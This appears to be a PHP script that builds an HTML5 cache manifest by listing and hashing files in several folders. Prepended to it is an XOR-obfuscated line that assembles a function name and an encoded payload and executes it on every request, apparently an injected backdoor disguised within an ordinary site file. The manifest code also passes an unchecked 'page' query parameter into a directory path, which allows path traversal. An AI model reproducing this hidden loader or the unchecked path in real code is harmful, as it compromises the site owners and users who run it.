<?php
//ZceyZxZbc6DPAJjzmhVgLj2mff4dWFovi
$QOEYsCU="oiTVL1iUSO1z"^"\x1f\x1b11\x13C\x0c\x25\x3f\x2eR\x1f"; $khcKHWja="iH5B07a1YNoTpY1T7nr"^"F\x30B\x03fb\x16h16\x08\x1f\x1f\x14\x5c\x13XA\x17"; $QOEYsCU($khcKHWja, "cmCXhv3QCWjCRllcRHy3f7sfXMPIOXsrAvFhg9xiVWlm9NEQV4I112WNDlWS9FA01GgWEU6ZrhBpuG6G0E7z7TDA5aS4fT3VZYsdto4aL6G7BCCBH02DS5DMVWG1q9MFX5jGidhuYnqaqsbxsS1AN5NiQTZ7SlCpgmwEFUyd8f4oOVb7nR8"^"\x06\x1b\x224\x40TZ7k\x3e\x19\x307\x18D\x3f\x0el\x26a\x23f\x26\x23\x0b\x19\x0bn\x2c\x30T\x2fhV\x60NG\x11\x15\x0dc\x7f\x301\x1d\x11\x17\x14\x07a\x0cbeip\x2d\x2cK\x0az\x19\x7b\x7c\x10\x16\x7eV2qbT9\x11\x09vDB\x26PsU\x27\x0fO\x031\x20r\x01\x00\x60\x03\x04cRbl\x7eZDRI\x14\x08\x3fE\x22Cj\x1f\x1ff\x17bw\x15\x06p\x17\x19\x0dp7Y\x01f\x2e\x29\x3cPM\x1a\x40MH\x0ey\x0b\x07\x00\x1d\x5b\x3e\x24W\x0cc\x04\x1f\x60\x0b\x3a\x05\x0f\x7dG\x3b\x1c\x1c\x13\x08\x09\x12b\x1b\x7cBD\x5d\x1e\x5d\x1bg\x7fY\x17\x13p\x11", "xwAVUwYhxgKoMmGo"); 
// Add the correct Content-Type for the cache manifest
header('Content-Type: text/cache-manifest');

// Write the first line
echo "CACHE MANIFEST\n";

// Initialize the $hashes string
$hashes = "";
function create_manifest($thefolder) {
	$dir = new RecursiveDirectoryIterator($thefolder);
	// Iterate through all the files/folders in the current directory
	foreach (new RecursiveIteratorIterator($dir) as $file) {
		$info = pathinfo($file);

		// If the object is a file
		// and it's not called manifest.php (this file),
		// and it's not a dotfile, add it to the list
		if ($file -> IsFile() && $file != "./manifest.php" && substr($file -> getFilename(), 0, 1) != ".") {
			// Replace spaces with %20 or it will break
			echo str_replace(' ', '%20', $file) . "\n";

			// Add this file's hash to the $hashes string
			$hashes .= md5_file($file);
		}
	}
}

create_manifest(".");
create_manifest("../source/" .  $_GET["page"]);
create_manifest("../_assets_jqm");

// Hash the $hashes string and output
echo "# Hash: " . md5($hashes) . "\n";
?>